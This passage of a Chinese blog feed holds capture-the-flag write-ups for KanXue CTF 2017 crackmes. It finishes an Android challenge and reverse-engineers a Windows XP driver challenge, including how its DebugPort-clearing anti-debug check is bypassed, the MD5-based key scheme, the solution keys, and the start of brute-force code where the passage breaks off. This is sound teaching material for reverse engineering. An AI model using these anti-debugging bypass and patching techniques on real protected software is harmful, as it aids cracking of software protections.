00 00 00 00  7.m_............</span><br></pre></td></tr></table></figure> <p>然后在hex窗口，f2修改内存，输入上面的24 fc…，然后f2确认修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B20  24 FC A3 BA 9D DE 0B 22  63 96 45 7A 0E 64 A6 18  $.</span><br><span class="line">5E127B30  74 A9 12 5E 0F 00 1F 00  FF FF 1F 00 0F 00 00 t..^..</span><br></pre></td></tr></table></figure></p> <p>然后f8。看看结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5E127B38  6D 61 64 65 62 79 65 72  69 63 6B 79 39 34 35 32  madebyericky9452</span><br><span class="line">5E127B48  38 00 73 00 11 10 00 00  62 00 69 00 6C 00 69 00  8.s.....b.i.l.i.</span><br></pre></td></tr></table></figure></p> <p>答案就是：madebyericky94528</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017-writeup6">https://anhkgg.github.io/kxctf2017-writeup6</a></p> <p>参考：</p> <ol> <li><a href="http://bbs.pediy.com/thread-217612.htm" target="_blank" rel="noopener">安卓APP动态调试技术–以IDA为例</a></li> <li><a href="http://luleimi.blog.163.com/blog/static/175219645201210922139272/" target="_blank" rel="noopener">http://luleimi.blog.163.com/blog/static/175219645201210922139272/</a></li> <li><a href="http://blog.csdn.net/zhangmiaoping23/article/details/43445797" target="_blank" rel="noopener">http://blog.csdn.net/zhangmiaoping23/article/details/43445797</a></li> <li><a href="http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html" target="_blank" rel="noopener">http://www.cnblogs.com/liujiahi/archive/2011/03/22/2196401.html</a></li> <li><a href="http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj" target="_blank" rel="noopener">http://cncc.bingj.com/cache.aspx?q=arm++IT+EQ&amp;d=4981012666125942&amp;mkt=zh-CN&amp;setlang=zh-CN&amp;w=YEX3ioizXLDZGmlpVDBGFh_dhhHpfnYj</a></li> </ol> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-36.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-36.htm&lt;/a&gt;&lt;/p&gt; &lt;p&gt;本题是安卓cm，目测肯定需要调试so。&lt;/p&gt; &lt;p&gt;准备工具：&lt;/p&gt; &lt;ol&gt; &lt;li&gt;ApkIde改之理（其他类似的也行，能够反编译apk，得到jar,so等）&lt;/li&gt; &lt;li&gt;IDA（用于调试so），需要6.x以上，忘了是x几，我用的6.6&lt;/li&gt; &lt;li&gt;adb(ApkIde改之理就有)&lt;/li&gt; &lt;/ol&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>            <category term="安卓" scheme="https://anhkgg.github.io/tags/%E5%AE%89%E5%8D%93/"/>            <category term="apk" scheme="https://anhkgg.github.io/tags/apk/"/>        </entry>      <entry>     <title>看雪CTF2017第五题 独行孤客CrackMe的writeup</title>     <link href="https://anhkgg.github.io/kxctf2017-writeup5/"/>     <id>https://anhkgg.github.io/kxctf2017-writeup5/</id>     <published>2017-06-11T06:42:16.000Z</published>     <updated>2017-06-17T00:18:16.200Z</updated>          <content type="html"><![CDATA[<p>题目入口：<a href="http://ctf.pediy.com/game-fight-35.htm" target="_blank" rel="noopener">http://ctf.pediy.com/game-fight-35.htm</a>，可下载相关文件</p> <blockquote> <p>本题需要在XP系统运行，因为驱动只支持xp</p> </blockquote> <h1 id="00-先看驱动"><a href="#00-先看驱动" class="headerlink" title="00. 先看驱动"></a>00. 先看驱动</h1><p>驱动不大，才20多个函数。</p> <p>从入口开始分析。</p> <h2 id="1-创建设备"><a href="#1-创建设备" class="headerlink" title="1. 创建设备"></a>1. 创建设备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000107D5 68 58 13 01 00                                                  push    offset aDeviceVmxdrv ; &quot;\\device\\vmxdrv&quot;</span><br><span class="line">.text:000107DA 8D 45 F4                                                        lea     eax, [ebp+DestinationString]</span><br><span class="line">.text:000107DD 33 FF                                                           xor     edi, edi</span><br><span class="line">.text:000107DF 50                                                              push    eax             ; DestinationString</span><br><span class="line">.text:000107E0 89 7D FC                                                        mov     [ebp+DeviceObject], edi</span><br><span class="line">.text:000107E3 FF D6                                                           call    esi ; RtlInitUnicodeString</span><br></pre></td></tr></table></figure> <a id="more"></a> <p>用来与应用层通信</p> <h2 id="2-IRP-MJ-FUNCTION"><a href="#2-IRP-MJ-FUNCTION" class="headerlink" title="2. IRP_MJ_FUNCTION"></a>2. IRP_MJ_FUNCTION</h2><p>主要有三个，read/write/ioctl。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010870 C7 46 44 A8 05 01 00                                            mov     dword ptr [esi+44h], offset f_DrvRead_105A8</span><br><span class="line">.text:00010877 C7 46 48 1C 06 01 00                                            mov     dword ptr [esi+48h], offset f_DrvWrite_1061C</span><br><span class="line">.text:0001087E C7 46 70 1A 07 01 00                                            mov     dword ptr [esi+70h], offset f_DrvControl_1071A</span><br></pre></td></tr></table></figure> <p>先看f_DrvWrite_1061C，通过irp获取到上层传入的数据，然后通过104b6获取某个输出存入全局变量g_READCC（根据read的分析，可以知道长度为4的4字节数组）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00010669 57                                                              push    edi             ; size_t</span><br><span class="line">.text:0001066A FF 75 0C                                                        push    [ebp+Irp]       ; void *</span><br><span class="line">.text:0001066D 53                                                              push    ebx             ; void *</span><br><span class="line">.text:0001066E E8 11 0C 00 00                                                  call    memcpy</span><br><span class="line">.text:00010673 83 C4 18                                                        add     esp, 18h</span><br><span class="line">.text:00010676 83 3D D8 14 01 00 00                                            cmp     dword ptr is_clean_port, 0</span><br><span class="line">.text:0001067D 74 15                                                           jz      short loc_10694</span><br><span class="line">.text:0001067F 68 C8 14 01 00                                                  push    offset g_READCC ; int</span><br><span class="line">.text:00010684 53                                                              push    ebx             ; void *</span><br><span class="line">.text:00010685 E8 2C FE FF FF                                                  call    f_GetMd5_104B6</span><br><span class="line">.text:0001068A C7 05 DC 14 01 00 01 00 00 00                                   mov     is_write, 1</span><br></pre></td></tr></table></figure></p> <p>进入104b6内部，key是个16字节数组，初始化0。然后将上面传下的数据拷贝到key中，长度需要小于16。然后将key进行一下变换。<br>key[0] ++(反调试标志为1，后面再说)，其他key[i] += i<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:000104F5 56                                                              push    esi             ; size_t //长度</span><br><span class="line">.text:000104F6 51                                                              push    ecx             ; void * //上层输入</span><br><span class="line">.text:000104F7 8D 45 EC                                                        lea     eax, [ebp+key]</span><br><span class="line">.text:000104FA 50                                                              push    eax             ; void *</span><br><span class="line">.text:000104FB E8 84 0D 00 00                                                  call    memcpy</span><br><span class="line">...</span><br><span class="line">text:00010505 39 05 D8 14 01 00                                               cmp     dword ptr is_clean_port, eax //判断标志是否为0，不为0，key[0] ++</span><br><span class="line">.text:0001050B 74 03                                                           jz      short loc_10510</span><br><span class="line">.text:0001050D FE 45 EC                                                        inc     [ebp+key]</span><br><span class="line">.text:00010510</span><br><span class="line">.text:00010510                                                 loc_10510:                              ; CODE XREF: f_GetMd5_104B6+55</span><br><span class="line">.text:00010510 3B F0                                                           cmp     esi, eax</span><br><span class="line">.text:00010512 7E 09                                                           jle     short loc_1051D</span><br><span class="line">.text:00010514</span><br><span class="line">.text:00010514                                                 loc_10514:                              ; CODE XREF: f_GetMd5_104B6+65</span><br><span class="line">.text:00010514 00 44 05 EC                                                     add     [ebp+eax+key], al //key[i] += i</span><br><span class="line">.text:00010518 40                                                              inc     eax</span><br><span class="line">.text:00010519 3B C6                                                           cmp     eax, esi</span><br><span class="line">.text:0001051B 7C F7                                                           jl      short loc_10514</span><br></pre></td></tr></table></figure></p> <p>接着通过下面三个函数对key进行计算，输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f_Md5_Init_108B2((MD5OBJ *)&amp;v5);</span><br><span class="line">f_Md5_j_11124((MD5OBJ *)&amp;v5, key, strlen(key));</span><br><span class="line">f_Md5_hexdigest((int)&amp;v5, md5);</span><br></pre></td></tr></table></figure></p> <p>进入108b2一看就猜测是md5计算，f_Md5_hexdigest将计算结果(32字节字符)保存到md<br>5字段中输出，设置计算标志。也就是大致确认write是计算md5，然后保存到g_READCC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MD5OBJ *__stdcall f_Md5_Init_108B2(MD5OBJ *a1)</span><br><span class="line">&#123;</span><br><span class="line">  MD5OBJ *result; // eax@1</span><br><span class="line">_DrvControl</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;len8 = 0;</span><br><span class="line">  a1-&gt;unk_4 = 0;</span><br><span class="line">  a1-&gt;s1 = 0x67452301;</span><br><span class="line">  a1-&gt;s2 = 0xEFCDAB89;</span><br><span class="line">  a1-&gt;s3 = 0x98BADCFE;</span><br><span class="line">  a1-&gt;s4 = 0x10325476;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p> <p>接着看f_DrvRead_105A8，看刚才的计算标志是否为0，为0就初始化g_READCC一段值（不知道作者意图，迷惑cracker？），如果计算标志是1，就直接返回计算的结果，然后该值返回到用户空间。也就是如果通过write计算了md5，这里就是获取md5计算结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000105AD </span><br><span class="line"> if ( !is_write )</span><br><span class="line">  &#123;</span><br><span class="line">    i = 3;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      g_READCC[i] = 3 * i - &apos;d&apos;;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( i &lt; 16 );</span><br><span class="line">    g_READCC[0] = 0xCBu;</span><br><span class="line">    g_READCC[1] = 0xAAu;</span><br><span class="line">    g_READCC[2] = 0xDEu;</span><br><span class="line">    g_READCC[3] = 0xB0u;</span><br><span class="line">  &#125;</span><br><span class="line">  //返回数据</span><br><span class="line">   *(_DWORD *)&amp;MasterIrp-&gt;Type = *(_DWORD *)g_READCC;</span><br><span class="line">  v4 = (int)&amp;MasterIrp-&gt;MdlAddress;</span><br><span class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[4];</span><br><span class="line">  v4 += 4;</span><br><span class="line">  *(_DWORD *)v4 = *(_DWORD *)&amp;g_READCC[8];</span><br><span class="line">  *(_DWORD *)(v4 + 4) = *(_DWORD *)&amp;g_READCC[12];</span><br></pre></td></tr></table></figure></p> <p>最后看f_DrvControl_1071A，支持多个命令号，但只有222004h有用。设置反调试标志为1，然后进入10486看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00010734 2D 04 20 22 00                                                  sub     eax, 222004h</span><br><span class="line">.text:00010739 8B 4E 0C                                                        mov     ecx, [esi+0Ch]</span><br><span class="line">.text:0001073C 74 2C                                                           jz      short loc_1076A</span><br><span class="line">...</span><br><span class="line">.text:0001076A                                                 loc_1076A:                              ; CODE XREF: f_DrvControl_1071A+22</span><br><span class="line">.text:0001076A C7 05 D8 14 01 00 01 00 00 00                                   mov     dword ptr is_clean_port, 1</span><br><span class="line">.text:00010774 FF 15 80 13 01 00                                               call    ds:IoGetCurrentProcess</span><br><span class="line">.text:0001077A A3 E0 14 01 00                                                  mov     eproc, eax</span><br><span class="line">.text:0001077F E8 02 FD FF FF                                                  call    f_ClearDebugPort_10486</span><br></pre></td></tr></table></figure></p> <p>枚举进程找到当前进程的eprocess(其实没必要枚举把)，置eprocess-&gt;DebugPort = NULL，让应用层调试器失效，达到反跳试效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = IoGetCurrentProcess();</span><br><span class="line">  v1 = result;</span><br><span class="line">  while ( result != (PEPROCESS)eproc )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (PEPROCESS)(*((_DWORD *)result + 0x22) - 0x88);// eproc-&gt;ActiveProcessLinks.Flink</span><br><span class="line">    if ( result == v1 )</span><br><span class="line">      return result;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)result + 0x2F) = 0;               // eproc-&gt;DebugPort = 0</span><br></pre></td></tr></table></figure></p> <p>这里猜想一下，如果破解者通过应用层patch，不发送222004h命令来解除反跳试的话，那么这里的反跳试标志就是0，然后在write中计算md5时，对key[0]就不会做++操作，那么上层就会获取到一个错误的值，从而影响破解。</p> <h2 id="3-k掉驱动反调试"><a href="#3-k掉驱动反调试" class="headerlink" title="3. k掉驱动反调试"></a>3. k掉驱动反调试</h2><p>首先想到的是将驱动文件patch，也就是DebugPort置零的指令nop掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:000104A9 83 A0 BC 00 00 00 00                                            and     dword ptr [eax+0BCh], 0</span><br></pre></td></tr></table></figure></p> <p>通过reshacker将驱动资源导出来，然后hex编辑工具修改104A9的内容(文件内存对齐一样)为7个NOP，然后再将patch驱动文件导入到exe中。</p> <p>会提示驱动加载失败，可能有校验，不再细跟。</p> <p>没办法，为了让od能够调试，我写了个简单驱动，在本驱动加载时，将104A进行patch，通过反跳试。</p> <h1 id="01-再看CrackMe"><a href="#01-再看CrackMe" class="headerlink" title="01. 再看CrackMe"></a>01. 再看CrackMe</h1><p>既然知道有驱动了，先找找释放和加载驱动的代码，通过 FindResourceA和CreateService即可定位（不再详述），注意到的是，驱动加载成功会设置一个标志，用于后面验证的判断</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5 = f_CreaetSrv_401AA0(ServiceName, &amp;Buffer);// vmxdrv</span><br><span class="line"> v1-&gt;is_drv_run = v5;</span><br></pre></td></tr></table></figure> <p>然后再找和驱动通信的代码，通过DeviceIoControl找到调用222004命令好的代码。通过创建一个线程，循环调用该接口来清零DebugPort</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   v0 = CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);</span><br><span class="line">   if ( v0 == (HANDLE)-1 )</span><br><span class="line">     break;</span><br><span class="line">   DeviceIoControl(v0, 0x222004u, 0, 0, &amp;OutBuffer, 0x100u, &amp;BytesReturned, 0);</span><br><span class="line">   CloseHandle(v0);</span><br><span class="line">   Sleep(0xBB8u);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure> <p>按理说这里可以patch掉来去掉反跳试，但就会出现我前面分析提到的问题。</p> <p>通过WriteFile找到调用read/write的位置，也就是计算md5和获取md5的位置。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00401D50 ; HANDLE __thiscall f_CalcKeyMd5_401D50(void *this, char *key, size_t len)</span><br><span class="line">...</span><br><span class="line">.text:00401E4E                 push    ebx             ; lpOverlapped</span><br><span class="line">.text:00401E4F                 push    eax             ; lpNumberOfBytesWritten</span><br><span class="line">.text:00401E50                 lea     ecx, [esp+344h+Buffer] //用户输入的key相关数据</span><br><span class="line">.text:00401E54                 push    esi             ; nNumberOfBytesToWrite</span><br><span class="line">.text:00401E55                 push    ecx             ; lpBuffer</span><br><span class="line">.text:00401E56                 push    edi             ; hFile</span><br><span class="line">.text:00401E57                 call    ds:WriteFile //计算md5</span><br><span class="line">.text:00401E5D                 test    eax, eax</span><br><span class="line">.text:00401E5F                 jz      short loc_401ED4</span><br><span class="line">.text:00401E61                 lea     edx, [esp+33Ch+NumberOfBytesRead]</span><br><span class="line">.text:00401E65                 push    ebx             ; lpOverlapped</span><br><span class="line">.text:00401E66                 push    edx             ; lpNumberOfBytesRead</span><br><span class="line">.text:00401E67                 lea     eax, [esp+344h+keymd5]</span><br><span class="line">.text:00401E6E                 push    10h             ; nNumberOfBytesToRead</span><br><span class="line">.text:00401E70                 push    eax             ; lpBuffer</span><br><span class="line">.text:00401E71                 push    edi             ; hFile</span><br><span class="line">.text:00401E72                 call    ds:ReadFile //读取md5</span><br></pre></td></tr></table></figure> <p>f_CalcKeyMd5_401D50回溯一层就是输入key回车的响应函数。<br>这里先通过UpdateData(1)获取输入数据，然后拷贝到局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_UpdateData_41A4F7(1);</span><br><span class="line">f_CString_copy_417D43((CString *)&amp;key, (LPCSTR *)&amp;v1-&gt;key);//用户输入的</span><br></pre></td></tr></table></figure></p> <p>然后输入进行小写和反转变换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_CString_lwr_4182FA((CString *)&amp;key); //小写</span><br><span class="line">f_Cstring_rev_41830C((CString *)&amp;key);        // 反转</span><br></pre></td></tr></table></figure></p> <p>判断输入长度是否为6，不是退出，清除输入，并通过IsDebuggerPresent检查是否在调试（OD直接过），是调试也退出，清理出输入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_DWORD *)(key - 8) != 6 || IsDebuggerPresent() )</span><br><span class="line">&#123;</span><br><span class="line">  CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</span><br><span class="line">  CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</span><br><span class="line">  f_UpdateData_41A4F7(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>满足长度要求，再看驱动是否加载，再调用f_CalcKeyMd5_401D50计算md5. 也就是调用驱动获取md5，记为KeyMd51.</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//.text:004017DE</span><br><span class="line"> if ( v1-&gt;is_drv_run )</span><br><span class="line">    &#123;</span><br><span class="line">      keymd5str = *(_DWORD *)(key - 8);</span><br><span class="line">      v3 = sub_418263(&amp;key, 0);</span><br><span class="line">      f_CalcKeyMd5_401D50(v1, (char *)v3, keymd5str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>接着下面两个函数，先调用f_GetStrMd5_401920（应用层的Md5，通过调试可以很快确认，内部也有md5特征）计算KeyMd51的Md5，记为KeyMd52，然后调用sub_415A78截取KeyMd52从第3为开始的10字符，记为KeyMd53。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f_GetStrMd5_401920((char)v4, (CString *)keymd5str);// 00943950  37 63 37 36 36 65 32 61 31 63 61 30 35 37 63 37  7c766e2a1ca057c7</span><br><span class="line">                                            // 00943960  62 30 65 39 31 66 39 33 35 65 64 61 61 64 37 33  b0e91f935edaad73</span><br><span class="line">                                            // </span><br><span class="line">                                            // </span><br><span class="line">                                            // </span><br><span class="line">sub_415A78((LPCSTR *)&amp;keymd5str_obj, (int)&amp;v9, 2, 0xAu);// 截取2开始长度0xA的值</span><br><span class="line">                                            // 00943900  37 36 36 65 32 61 31 63 61 30 00 38 39 30 33 38  766e2a1ca0.89038</span><br><span class="line">                                            // 00943910  33 39 32 36 39 32 65 38 32 64 36 33 62 31 37 64  392692e82d63b17d</span><br><span class="line">                                            //</span><br></pre></td></tr></table></figure> <p>最后KeyMd53与888aeda4ab比较，成功提示Success^^！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ( _mbsicmp(keymd5str_obj, a888aeda4ab) ) // 888aeda4ab</span><br><span class="line">    &#123;</span><br><span class="line">      CString::operator=((CString *)&amp;v1-&gt;unk_6c, byte_431398);</span><br><span class="line">      CString::operator=((CString *)&amp;v1-&gt;key, byte_431398);</span><br><span class="line">      f_UpdateData_41A4F7(0);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      f_ShowSuccess_402030(v1);//成功提示</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>总结算法：</p> <ol> <li>KEY1 = rev(lwr(key))，key长度6，将输入转小写，逆序</li> <li>反调试成功时KEY1[0]+=1, 其他KEY1[i]+=i;</li> <li>KEY2 = DrvMd5(KEY1)，驱动MD5计算</li> <li>KEY3 = Md5(KEY2), 应用层Md5计算</li> <li>KEY4 = KEY3[2:12]，取第3位开始的10个字符</li> <li>KEY4 == ‘888aeda4ab’</li> </ol> <h1 id="11-求解"><a href="#11-求解" class="headerlink" title="11. 求解"></a>11. 求解</h1><p>由于MD5hash无法逆运算，只能爆破了，刚开始忘了题目key只能是数字和字母，结果我跑了全字符，跑了1天多….没出来，卡hi是怀疑自己</p> <p>后来改成了数字字母，终于得到答案 su1987</p> <p>爆破代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">char Seed[/*68*/36] = &#123;</span><br><span class="line"> &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, 